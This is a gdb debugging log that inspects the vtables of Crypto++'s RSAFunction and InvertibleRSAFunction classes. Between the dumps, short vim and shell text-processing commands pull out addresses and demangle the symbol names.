0x7ffff7a8aa90 <_ZThn8_N8CryptoPP11RSAFunction18BERDecodePublicKeyERNS_22BufferedTransformationEbm>:    0x08ef8348
(gdb) x/w 0x00007ffff7a8a9f0
0x7ffff7a8a9f0 <_ZThn8_NK8CryptoPP11RSAFunction18DEREncodePublicKeyERNS_22BufferedTransformationE>:     0x08ef8348
(gdb) x/w 0x00007ffff7dc30c0
0x7ffff7dc30c0 <_ZTIN8CryptoPP11RSAFunctionE>:  0x0063f210
(gdb) x/w 0x0000000000428700
0x428700 <_ZThn16_N8CryptoPP11RSAFunctionD1Ev>: 0xe5894855
(gdb) x/w 0x00007ffff7a8f7f0
0x7ffff7a8f7f0 <_ZThn16_N8CryptoPP11RSAFunctionD0Ev>:   0x10ef8348
(gdb) x/w 0x00007ffff7a8ae70
0x7ffff7a8ae70 <_ZTv0_n32_NK8CryptoPP11RSAFunction12GetVoidValueEPKcRKSt9type_infoPv>:  0x49178b4c
(gdb) x/w 0x00007ffff7a8bad0
0x7ffff7a8bad0 <_ZTv0_n40_N8CryptoPP11RSAFunction10AssignFromERKNS_14NameValuePairsE>:  0x49178b4c
(gdb) x/w 0x00007ffff7a8ab20
0x7ffff7a8ab20 <_ZTv0_n48_NK8CryptoPP11RSAFunction8ValidateERNS_21RandomNumberGeneratorEj>:     0x49178b4c
(gdb) x/w 0x0000000000428d90
0x428d90 <_ZNK8CryptoPP14CryptoMaterial14ThrowIfInvalidERNS_21RandomNumberGeneratorEj>: 0xe5894855
(gdb) x/w 0x00007ffff798ff40
0x7ffff798ff40 <_ZTv0_n64_NK8CryptoPP18ASN1CryptoMaterialINS_9PublicKeyEE4SaveERNS_22BufferedTransformationE>: 0x49178b4c
(gdb) x/w 0x00007ffff798ff60
0x7ffff798ff60 <_ZTv0_n72_N8CryptoPP18ASN1CryptoMaterialINS_9PublicKeyEE4LoadERNS_22BufferedTransformationE>:  0x49178b4c
(gdb) x/w 0x0000000000429060
0x429060 <_ZNK8CryptoPP14CryptoMaterial22SupportsPrecomputationEv>:     0xe5894855
(gdb) x/w 0x0000000000429080
0x429080 <_ZN8CryptoPP14CryptoMaterial10PrecomputeEj>:  0xe5894855
(gdb) x/w 0x00000000004291a0
0x4291a0 <_ZN8CryptoPP14CryptoMaterial18LoadPrecomputationERNS_22BufferedTransformationE>:      0xe5894855
(gdb) x/w 0x00000000004292c0
0x4292c0 <_ZNK8CryptoPP14CryptoMaterial18SavePrecomputationERNS_22BufferedTransformationE>:     0xe5894855
(gdb)
-----
:!grep '^0x' | awk '{print $2}'
:normal 0xf>D
:!c++filt
-----
typeinfo for CryptoPP::RSAFunction
CryptoPP::RSAFunction::~RSAFunction()
CryptoPP::RSAFunction::~RSAFunction()
CryptoPP::RSAFunction::PreimageBound() const
CryptoPP::RSAFunction::ImageBound() const
CryptoPP::TrapdoorFunctionBounds::MaxPreimage() const
CryptoPP::TrapdoorFunctionBounds::MaxImage() const
CryptoPP::TrapdoorFunction::ApplyRandomizedFunction(CryptoPP::RandomNumberGenerator&, CryptoPP::Integer const&) const
CryptoPP::TrapdoorFunction::IsRandomized() const
CryptoPP::RSAFunction::ApplyFunction(CryptoPP::Integer const&) const
CryptoPP::RSAFunction::GetAlgorithmID() const
CryptoPP::RSAFunction::BERDecodePublicKey(CryptoPP::BufferedTransformation&, bool, unsigned long)
CryptoPP::RSAFunction::DEREncodePublicKey(CryptoPP::BufferedTransformation&) const
CryptoPP::RSAFunction::Validate(CryptoPP::RandomNumberGenerator&, unsigned int) const
CryptoPP::RSAFunction::GetVoidValue(char const*, std::type_info const&, void*) const
CryptoPP::RSAFunction::AssignFrom(CryptoPP::NameValuePairs const&)
typeinfo for CryptoPP::RSAFunction
non-virtual thunk to CryptoPP::RSAFunction::~RSAFunction()
non-virtual thunk to CryptoPP::RSAFunction::~RSAFunction()
CryptoPP::X509PublicKey::BERDecode(CryptoPP::BufferedTransformation&)
CryptoPP::X509PublicKey::DEREncode(CryptoPP::BufferedTransformation&) const
CryptoPP::ASN1Object::BEREncode(CryptoPP::BufferedTransformation&) const
CryptoPP::ASN1CryptoMaterial<CryptoPP::PublicKey>::Save(CryptoPP::BufferedTransformation&) const
CryptoPP::ASN1CryptoMaterial<CryptoPP::PublicKey>::Load(CryptoPP::BufferedTransformation&)
non-virtual thunk to CryptoPP::RSAFunction::GetAlgorithmID() const
CryptoPP::X509PublicKey::BERDecodeAlgorithmParameters(CryptoPP::BufferedTransformation&)
CryptoPP::X509PublicKey::DEREncodeAlgorithmParameters(CryptoPP::BufferedTransformation&) const
non-virtual thunk to CryptoPP::RSAFunction::BERDecodePublicKey(CryptoPP::BufferedTransformation&, bool, unsigned long)
non-virtual thunk to CryptoPP::RSAFunction::DEREncodePublicKey(CryptoPP::BufferedTransformation&) const
typeinfo for CryptoPP::RSAFunction
non-virtual thunk to CryptoPP::RSAFunction::~RSAFunction()
non-virtual thunk to CryptoPP::RSAFunction::~RSAFunction()
virtual thunk to CryptoPP::RSAFunction::GetVoidValue(char const*, std::type_info const&, void*) const
virtual thunk to CryptoPP::RSAFunction::AssignFrom(CryptoPP::NameValuePairs const&)
virtual thunk to CryptoPP::RSAFunction::Validate(CryptoPP::RandomNumberGenerator&, unsigned int) const
CryptoPP::CryptoMaterial::ThrowIfInvalid(CryptoPP::RandomNumberGenerator&, unsigned int) const
virtual thunk to CryptoPP::ASN1CryptoMaterial<CryptoPP::PublicKey>::Save(CryptoPP::BufferedTransformation&) const
virtual thunk to CryptoPP::ASN1CryptoMaterial<CryptoPP::PublicKey>::Load(CryptoPP::BufferedTransformation&)
CryptoPP::CryptoMaterial::SupportsPrecomputation() const
CryptoPP::CryptoMaterial::Precompute(unsigned int)
CryptoPP::CryptoMaterial::LoadPrecomputation(CryptoPP::BufferedTransformation&)
CryptoPP::CryptoMaterial::SavePrecomputation(CryptoPP::BufferedTransformation&) const
-----
(gdb) x/256wx 0x63dea0
0x63dea0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE>:      0x00000010      0x00000000      0x00000000      0x00000000
0x63deb0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+16>:   0xf7dc3100      0x00007fff      0x0041f810      0x00000000
0x63dec0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+32>:   0xf7a8f540      0x00007fff      0xf7a8e310      0x00007fff
0x63ded0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+48>:   0xf7a8e2f0      0x00007fff      0x00428ac0      0x00000000
0x63dee0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+64>:   0x00428b40      0x00000000      0x00428bc0      0x00000000
0x63def0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+80>:   0x00428c10      0x00000000      0xf7a8a740      0x00007fff
0x63df00 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+96>:   0xf7a8f010      0x00007fff      0xf7a8aa00      0x00007fff
0x63df10 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+112>:  0xf7a8a960      0x00007fff      0xf7a8b090      0x00007fff
0x63df20 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+128>:  0xf7a8ae80      0x00007fff      0xf7a8bae0      0x00007fff
0x63df30 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+144>:  0xf7a8e110      0x00007fff      0xf7a8e180      0x00007fff
0x63df40 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+160>:  0xf7a8e0d0      0x00007fff      0xf7a8e140      0x00007fff
0x63df50 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+176>:  0xf7a8abb0      0x00007fff      0xf7a8ace0      0x00007fff
0x63df60 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+192>:  0xf7a8d7b0      0x00007fff      0xf7a8bdf0      0x00007fff
0x63df70 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+208>:  0x00000008      0x00000000      0xfffffff8      0xffffffff
0x63df80 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+224>:  0xf7dc3100      0x00007fff      0x0042b470      0x00000000
0x63df90 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+240>:  0xf7a8f5b0      0x00007fff      0xf7a8e120      0x00007fff
0x63dfa0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+256>:  0xf7a8e190      0x00007fff      0x004289f0      0x00000000
0x63dfb0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+272>:  0xf7a8e150      0x00007fff      0xf7a8e0e0      0x00007fff
0x63dfc0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+288>:  0xf7a8f020      0x00007fff      0xf7990c10      0x00007fff
0x63dfd0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+304>:  0xf7990bd0      0x00007fff      0xf7a8aa90      0x00007fff
0x63dfe0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+320>:  0xf7a8a9f0      0x00007fff      0x00000000      0x00000000
0x63dff0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+336>:  0x00000000      0x00000000      0x00000000      0x00000000
0x63e000 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+352>:  0x00000000      0x00000000      0x00000000      0x00000000
0x63e010 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+368>:  0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0x63e020 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+384>:  0x00000000      0x00000000      0xfffffff0      0xffffffff
0x63e030 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+400>:  0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0x63e040 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+416>:  0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0x63e050 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+432>:  0xf7dc3100      0x00007fff      0x0042b4d0      0x00000000
0x63e060 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+448>:  0xf7a8f5a0      0x00007fff      0xf7a8afd0      0x00007fff
0x63e070 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+464>:  0xf7a8bc20      0x00007fff      0xf7a8ba40      0x00007fff
0x63e080 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+480>:  0x00428d90      0x00000000      0xf7a8e160      0x00007fff
0x63e090 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+496>:  0xf7a8e0f0      0x00007fff      0x00429060      0x00000000
0x63e0a0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+512>:  0x00429080      0x00000000      0x004291a0      0x00000000
0x63e0b0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+528>:  0x004292c0      0x00000000      0xffffff98      0xffffffff
0x63e0c0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+544>:  0xf7dc3100      0x00007fff      0x0042b500      0x00000000
0x63e0d0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+560>:  0xf7a8f590      0x00007fff      0x0042ba20      0x00000000
0x63e0e0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+576>:  0x0042ba80      0x00000000      0xf7a8dc80      0x00007fff
0x63e0f0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+592>:  0xffffffa0      0xffffffff      0xffffff90      0xffffffff
0x63e100 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+608>:  0xf7dc3100      0x00007fff      0x0042b530      0x00000000
0x63e110 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+624>:  0xf7a8f580      0x00007fff      0xf7a8e130      0x00007fff
0x63e120 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+640>:  0xf7a8e1a0      0x00007fff      0x004289f0      0x00000000
0x63e130 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+656>:  0xf7a8e170      0x00007fff      0xf7a8e100      0x00007fff
0x63e140 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+672>:  0xf7a8f030      0x00007fff      0xf7990bf0      0x00007fff
0x63e150 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+688>:  0xf7990bb0      0x00007fff      0xf7a8acd0      0x00007fff
0x63e160 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+704>:  0xf7a8add0      0x00007fff      0xf798f230      0x00007fff
0x63e170 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+720>:  0xf798db30      0x00007fff      0xffffff98      0xffffffff
0x63e180 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+736>:  0xffffff98      0xffffffff      0xffffff98      0xffffffff
0x63e190 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+752>:  0xffffff98      0xffffffff      0xffffff98      0xffffffff
0x63e1a0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+768>:  0xffffff88      0xffffffff      0xffffff88      0xffffffff
0x63e1b0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+784>:  0xffffff98      0xffffffff      0xffffff88      0xffffffff
0x63e1c0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+800>:  0xffffff88      0xffffffff      0xffffff88      0xffffffff
0x63e1d0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+816>:  0xffffff88      0xffffffff      0xffffff88      0xffffffff
0x63e1e0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+832>:  0xf7dc3100      0x00007fff      0x0042b560      0x00000000
0x63e1f0 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+848>:  0xf7a8f570      0x00007fff      0x00000000      0x00000000
0x63e200 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+864>:  0x00000000      0x00000000      0x00000000      0x00000000
0x63e210 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+880>:  0x00000000      0x00000000      0x00000000      0x00000000
0x63e220 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+896>:  0x00000000      0x00000000      0x00000000      0x00000000
0x63e230 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+912>:  0x00000000      0x00000000      0x00000000      0x00000000
0x63e240 <_ZTVN8CryptoPP21InvertibleRSAFunctionE+928>:  0x00000000      0x00000000      0xf7a8ca90      0x00007fff
0x63e250:       0x00000000      0x00000000      0x00000000      0x00000000
0x63e260 <_ZTVN8CryptoPP22CFB_EncryptionTemplateINS_20AbstractPolicyHolderINS_24CFB_CipherAbstractPolicyENS_14CFB_ModePolicyEEEEE>:     0x00000000      0x00000000      0x0063f0e0      0x00000000
0x63e270 <_ZTVN8CryptoPP22CFB_EncryptionTemplateINS_20AbstractPolicyHolderINS_24CFB_CipherAbstractPolicyENS_14CFB_ModePolicyEEEEE+16>:  0xf79efe60      0x00007fff      0xf79efe00      0x00007fff
0x63e280 <_ZTVN8CryptoPP22CFB_EncryptionTemplateINS_20AbstractPolicyHolderINS_24CFB_CipherAbstractPolicyENS_14CFB_ModePolicyEEEEE+32>:  0x00424400      0x00000000      0x00424430      0x00000000
0x63e290 <_ZTVN8CryptoPP22CFB_EncryptionTemplateINS_20AbstractPolicyHolderINS_24CFB_CipherAbstractPolicyENS_14CFB_ModePolicyEEEEE+48>:  0x00424460      0x00000000      0x00424490      0x00000000
(gdb)
-----
0x00000010      0x00000000      0x00000000      0x00000000
0xf7dc3100      0x00007fff      0x0041f810      0x00000000
0xf7a8f540      0x00007fff      0xf7a8e310      0x00007fff
0xf7a8e2f0      0x00007fff      0x00428ac0      0x00000000
0x00428b40      0x00000000      0x00428bc0      0x00000000
0x00428c10      0x00000000      0xf7a8a740      0x00007fff
0xf7a8f010      0x00007fff      0xf7a8aa00      0x00007fff
0xf7a8a960      0x00007fff      0xf7a8b090      0x00007fff
0xf7a8ae80      0x00007fff      0xf7a8bae0      0x00007fff
0xf7a8e110      0x00007fff      0xf7a8e180      0x00007fff
0xf7a8e0d0      0x00007fff      0xf7a8e140      0x00007fff
0xf7a8abb0      0x00007fff      0xf7a8ace0      0x00007fff
0xf7a8d7b0      0x00007fff      0xf7a8bdf0      0x00007fff
0x00000008      0x00000000      0xfffffff8      0xffffffff
0xf7dc3100      0x00007fff      0x0042b470      0x00000000
0xf7a8f5b0      0x00007fff      0xf7a8e120      0x00007fff
0xf7a8e190      0x00007fff      0x004289f0      0x00000000
0xf7a8e150      0x00007fff      0xf7a8e0e0      0x00007fff
0xf7a8f020      0x00007fff      0xf7990c10      0x00007fff
0xf7990bd0      0x00007fff      0xf7a8aa90      0x00007fff
0xf7a8a9f0      0x00007fff      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0x00000000      0x00000000      0xfffffff0      0xffffffff
0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0xf7dc3100      0x00007fff      0x0042b4d0      0x00000000
0xf7a8f5a0      0x00007fff      0xf7a8afd0      0x00007fff
0xf7a8bc20      0x00007fff      0xf7a8ba40      0x00007fff
0x00428d90      0x00000000      0xf7a8e160      0x00007fff
0xf7a8e0f0      0x00007fff      0x00429060      0x00000000
0x00429080      0x00000000      0x004291a0      0x00000000
0x004292c0      0x00000000      0xffffff98      0xffffffff
0xf7dc3100      0x00007fff      0x0042b500      0x00000000
0xf7a8f590      0x00007fff      0x0042ba20      0x00000000
0x0042ba80      0x00000000      0xf7a8dc80      0x00007fff
0xffffffa0      0xffffffff      0xffffff90      0xffffffff
0xf7dc3100      0x00007fff      0x0042b530      0x00000000
0xf7a8f580      0x00007fff      0xf7a8e130      0x00007fff
0xf7a8e1a0      0x00007fff      0x004289f0      0x00000000
0xf7a8e170      0x00007fff      0xf7a8e100      0x00007fff
0xf7a8f030      0x00007fff      0xf7990bf0      0x00007fff
0xf7990bb0      0x00007fff      0xf7a8acd0      0x00007fff
0xf7a8add0      0x00007fff      0xf798f230      0x00007fff
0xf798db30      0x00007fff      0xffffff98      0xffffffff
0xffffff98      0xffffffff      0xffffff98      0xffffffff
0xffffff98      0xffffffff      0xffffff98      0xffffffff
0xffffff88      0xffffffff      0xffffff88      0xffffffff
0xffffff98      0xffffffff      0xffffff88      0xffffffff
0xffffff88      0xffffffff      0xffffff88      0xffffffff
0xffffff88      0xffffffff      0xffffff88      0xffffffff
0xf7dc3100      0x00007fff      0x0042b560      0x00000000
0xf7a8f570      0x00007fff      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0xf7a8ca90      0x00007fff
-----
:!awk '{print $2 $1; print $4 $3}' | sed 's/0x//g' | sed 's@^@x/w 0x@' | grep -v '\(0\|f\)\{12,\}'
-----
x/w 0x00007ffff7dc3100
x/w 0x000000000041f810
x/w 0x00007ffff7a8f540
x/w 0x00007ffff7a8e310
x/w 0x00007ffff7a8e2f0
x/w 0x0000000000428ac0
x/w 0x0000000000428b40
x/w 0x0000000000428bc0
x/w 0x0000000000428c10
x/w 0x00007ffff7a8a740
x/w 0x00007ffff7a8f010
x/w 0x00007ffff7a8aa00
x/w 0x00007ffff7a8a960
x/w 0x00007ffff7a8b090
x/w 0x00007ffff7a8ae80
x/w 0x00007ffff7a8bae0
x/w 0x00007ffff7a8e110
x/w 0x00007ffff7a8e180
x/w 0x00007ffff7a8e0d0
x/w 0x00007ffff7a8e140
x/w 0x00007ffff7a8abb0
x/w 0x00007ffff7a8ace0
x/w 0x00007ffff7a8d7b0
x/w 0x00007ffff7a8bdf0
x/w 0x00007ffff7dc3100
x/w 0x000000000042b470
x/w 0x00007ffff7a8f5b0
x/w 0x00007ffff7a8e120
x/w 0x00007ffff7a8e190
x/w 0x00000000004289f0
x/w 0x00007ffff7a8e150
x/w 0x00007ffff7a8e0e0
x/w 0x00007ffff7a8f020
x/w 0x00007ffff7990c10
x/w 0x00007ffff7990bd0
x/w 0x00007ffff7a8aa90
x/w 0x00007ffff7a8a9f0
x/w 0x00007ffff7dc3100
x/w 0x000000000042b4d0
x/w 0x00007ffff7a8f5a0
x/w 0x00007ffff7a8afd0
x/w 0x00007ffff7a8bc20
x/w 0x00007ffff7a8ba40
x/w 0x0000000000428d90
x/w 0x00007ffff7a8e160
x/w 0x00007ffff7a8e0f0
x/w 0x0000000000429060
x/w 0x0000000000429080
x/w 0x00000000004291a0
x/w 0x00000000004292c0
x/w 0x00007ffff7dc3100
x/w 0x000000000042b500
x/w 0x00007ffff7a8f590
x/w 0x000000000042ba20
x/w 0x000000000042ba80
x/w 0x00007ffff7a8dc80
x/w 0x00007ffff7dc3100
x/w 0x000000000042b530
x/w 0x00007ffff7a8f580
x/w 0x00007ffff7a8e130
x/w 0x00007ffff7a8e1a0
x/w 0x00000000004289f0
x/w 0x00007ffff7a8e170
x/w 0x00007ffff7a8e100
x/w 0x00007ffff7a8f030
x/w 0x00007ffff7990bf0
x/w 0x00007ffff7990bb0
x/w 0x00007ffff7a8acd0
x/w 0x00007ffff7a8add0
x/w 0x00007ffff798f230
x/w 0x00007ffff798db30
x/w 0x00007ffff7dc3100
x/w 0x000000000042b560
x/w 0x00007ffff7a8f570
x/w 0x00007ffff7a8ca90
-----
(gdb) x/w 0x00007ffff7dc3100
0x7ffff7dc3100 <_ZTIN8CryptoPP21InvertibleRSAFunctionE>:        0x0063f210
(gdb) x/w 0x000000000041f810
0x41f810 <_ZN8CryptoPP21InvertibleRSAFunctionD1Ev>:     0xe5894855
(gdb) x/w 0x00007ffff7a8f540
0x7ffff7a8f540 <_ZN8CryptoPP21InvertibleRSAFunctionD0Ev>:       0xfb894853
(gdb) x/w 0x00007ffff7a8e310
0x7ffff7a8e310 <_ZNK8CryptoPP11RSAFunction13PreimageBoundEv>:   0xc6834853
(gdb) x/w 0x00007ffff7a8e2f0
0x7ffff7a8e2f0 <_ZNK8CryptoPP11RSAFunction10ImageBoundEv>:      0xc6834853
(gdb) x/w 0x0000000000428ac0
0x428ac0 <_ZNK8CryptoPP22TrapdoorFunctionBounds11MaxPreimageEv>:        0xe5894855
(gdb) x/w 0x0000000000428b40
0x428b40 <_ZNK8CryptoPP22TrapdoorFunctionBounds8MaxImageEv>:    0xe5894855
(gdb) x/w 0x0000000000428bc0
0x428bc0 <_ZNK8CryptoPP16TrapdoorFunction23ApplyRandomizedFunctionERNS_21RandomNumberGeneratorERKNS_7IntegerE>:0xe5894855
(gdb) x/w 0x0000000000428c10
0x428c10 <_ZNK8CryptoPP16TrapdoorFunction12IsRandomizedEv>:     0xe5894855
(gdb) x/w 0x00007ffff7a8a740
0x7ffff7a8a740 <_ZNK8CryptoPP11RSAFunction13ApplyFunctionERKNS_7IntegerE>:      0x245c8948
(gdb) x/w 0x00007ffff7a8f010
0x7ffff7a8f010 <_ZNK8CryptoPP21InvertibleRSAFunction14GetAlgorithmIDEv>:        0xfb894853
(gdb) x/w 0x00007ffff7a8aa00
0x7ffff7a8aa00 <_ZN8CryptoPP11RSAFunction18BERDecodePublicKeyERNS_22BufferedTransformationEbm>: 0x0030ba55
(gdb) x/w 0x00007ffff7a8a960
0x7ffff7a8a960 <_ZNK8CryptoPP11RSAFunction18DEREncodePublicKeyERNS_22BufferedTransformationE>:  0x0030ba55
(gdb) x/w 0x00007ffff7a8b090
0x7ffff7a8b090 <_ZNK8CryptoPP21InvertibleRSAFunction8ValidateERNS_21RandomNumberGeneratorEj>:   0x245c8948
(gdb) x/w 0x00007ffff7a8ae80
0x7ffff7a8ae80 <_ZNK8CryptoPP21InvertibleRSAFunction12GetVoidValueEPKcRKSt9type_infoPv>:        0x98ec8148
(gdb) x/w 0x00007ffff7a8bae0
0x7ffff7a8bae0 <_ZN8CryptoPP21InvertibleRSAFunction10AssignFromERKNS_14NameValuePairsE>:        0x88ec8148
(gdb) x/w 0x00007ffff7a8e110
0x7ffff7a8e110 <_ZN8CryptoPP21InvertibleRSAFunction9BERDecodeERNS_22BufferedTransformationE>:   0x70c78348
(gdb) x/w 0x00007ffff7a8e180
0x7ffff7a8e180 <_ZNK8CryptoPP21InvertibleRSAFunction9DEREncodeERNS_22BufferedTransformationE>:  0x70c78348
(gdb) x/w 0x00007ffff7a8e0d0
0x7ffff7a8e0d0 <_ZN8CryptoPP21InvertibleRSAFunction4LoadERNS_22BufferedTransformationE>:        0x70c78348
(gdb) x/w 0x00007ffff7a8e140
0x7ffff7a8e140 <_ZNK8CryptoPP21InvertibleRSAFunction4SaveERNS_22BufferedTransformationE>:       0x70c78348
(gdb) x/w 0x00007ffff7a8abb0
0x7ffff7a8abb0 <_ZN8CryptoPP21InvertibleRSAFunction19BERDecodePrivateKeyERNS_22BufferedTransformationEbm>:     0x0030ba55
(gdb) x/w 0x00007ffff7a8ace0
0x7ffff7a8ace0 <_ZNK8CryptoPP21InvertibleRSAFunction19DEREncodePrivateKeyERNS_22BufferedTransformationE>:      0x0030ba55
(gdb) x/w 0x00007ffff7a8d7b0
0x7ffff7a8d7b0 <_ZNK8CryptoPP21InvertibleRSAFunction16CalculateInverseERNS_21RandomNumberGeneratorERKNS_7IntegerE>:     0x56415741
(gdb) x/w 0x00007ffff7a8bdf0
0x7ffff7a8bdf0 <_ZN8CryptoPP21InvertibleRSAFunction14GenerateRandomERNS_21RandomNumberGeneratorERKNS_14NameValuePairsE>:        0x56415741
(gdb) x/w 0x00007ffff7dc3100
0x7ffff7dc3100 <_ZTIN8CryptoPP21InvertibleRSAFunctionE>:        0x0063f210
(gdb) x/w 0x000000000042b470
0x42b470 <_ZThn8_N8CryptoPP21InvertibleRSAFunctionD1Ev>:        0xe5894855
(gdb) x/w 0x00007ffff7a8f5b0
0x7ffff7a8f5b0 <_ZThn8_N8CryptoPP21InvertibleRSAFunctionD0Ev>:  0x08ef8348
(gdb) x/w 0x00007ffff7a8e120
0x7ffff7a8e120 <_ZThn8_N8CryptoPP21InvertibleRSAFunction9BERDecodeERNS_22BufferedTransformationE>:      0x08ef8348
(gdb) x/w 0x00007ffff7a8e190
0x7ffff7a8e190 <_ZThn8_NK8CryptoPP21InvertibleRSAFunction9DEREncodeERNS_22BufferedTransformationE>:     0x08ef8348
(gdb) x/w 0x00000000004289f0
0x4289f0 <_ZNK8CryptoPP10ASN1Object9BEREncodeERNS_22BufferedTransformationE>:   0xe5894855
(gdb) x/w 0x00007ffff7a8e150
0x7ffff7a8e150 <_ZThn8_NK8CryptoPP21InvertibleRSAFunction4SaveERNS_22BufferedTransformationE>:  0x08ef8348
(gdb) x/w 0x00007ffff7a8e0e0
0x7ffff7a8e0e0 <_ZThn8_N8CryptoPP21InvertibleRSAFunction4LoadERNS_22BufferedTransformationE>:   0x08ef8348
(gdb) x/w 0x00007ffff7a8f020
0x7ffff7a8f020 <_ZThn8_NK8CryptoPP21InvertibleRSAFunction14GetAlgorithmIDEv>:   0x08ee8348
(gdb) x/w 0x00007ffff7990c10
0x7ffff7990c10 <_ZN8CryptoPP13X509PublicKey28BERDecodeAlgorithmParametersERNS_22BufferedTransformationE>:      0x08ec8348
(gdb) x/w 0x00007ffff7990bd0
0x7ffff7990bd0 <_ZNK8CryptoPP13X509PublicKey28DEREncodeAlgorithmParametersERNS_22BufferedTransformationE>:     0x08ec8348
(gdb) x/w 0x00007ffff7a8aa90
0x7ffff7a8aa90 <_ZThn8_N8CryptoPP11RSAFunction18BERDecodePublicKeyERNS_22BufferedTransformationEbm>:    0x08ef8348
(gdb) x/w 0x00007ffff7a8a9f0
0x7ffff7a8a9f0 <_ZThn8_NK8CryptoPP11RSAFunction18DEREncodePublicKeyERNS_22BufferedTransformationE>:     0x08ef8348
(gdb) x/w 0x00007ffff7dc3100
0x7ffff7dc3100 <_ZTIN8CryptoPP21InvertibleRSAFunctionE>:        0x0063f210
(gdb) x/w 0x000000000042b4d0
0x42b4d0 <_ZThn16_N8CryptoPP21InvertibleRSAFunctionD1Ev>:       0xe5894855
(gdb) x/w 0x00007ffff7a8f5a0
0x7ffff7a8f5a0 <_ZThn16_N8CryptoPP21InvertibleRSAFunctionD0Ev>: 0x10ef8348
(gdb) x/w 0x00007ffff7a8afd0
0x7ffff7a8afd0 <_ZTv0_n32_NK8CryptoPP21InvertibleRSAFunction12GetVoidValueEPKcRKSt9type_infoPv>:        0x49178b4c
(gdb) x/w 0x00007ffff7a8bc20
0x7ffff7a8bc20 <_ZTv0_n40_N8CryptoPP21InvertibleRSAFunction10AssignFromERKNS_14NameValuePairsE>:        0x49178b4c
(gdb) x/w 0x00007ffff7a8ba40
0x7ffff7a8ba40 <_ZTv0_n48_NK8CryptoPP21InvertibleRSAFunction8ValidateERNS_21RandomNumberGeneratorEj>:   0x49178b4c
(gdb) x/w 0x0000000000428d90
0x428d90 <_ZNK8CryptoPP14CryptoMaterial14ThrowIfInvalidERNS_21RandomNumberGeneratorEj>: 0xe5894855
(gdb) x/w 0x00007ffff7a8e160
0x7ffff7a8e160 <_ZTv0_n64_NK8CryptoPP21InvertibleRSAFunction4SaveERNS_22BufferedTransformationE>:       0x49178b4c
(gdb) x/w 0x00007ffff7a8e0f0
0x7ffff7a8e0f0 <_ZTv0_n72_N8CryptoPP21InvertibleRSAFunction4LoadERNS_22BufferedTransformationE>:        0x49178b4c
(gdb) x/w 0x0000000000429060
0x429060 <_ZNK8CryptoPP14CryptoMaterial22SupportsPrecomputationEv>:     0xe5894855
(gdb) x/w 0x0000000000429080
0x429080 <_ZN8CryptoPP14CryptoMaterial10PrecomputeEj>:  0xe5894855
(gdb) x/w 0x00000000004291a0
0x4291a0 <_ZN8CryptoPP14CryptoMaterial18LoadPrecomputationERNS_22BufferedTransformationE>:      0xe5894855
(gdb) x/w 0x00000000004292c0
0x4292c0 <_ZNK8CryptoPP14CryptoMaterial18SavePrecomputationERNS_22BufferedTransformationE>:     0xe5894855
(gdb) x/w 0x00007ffff7dc3100
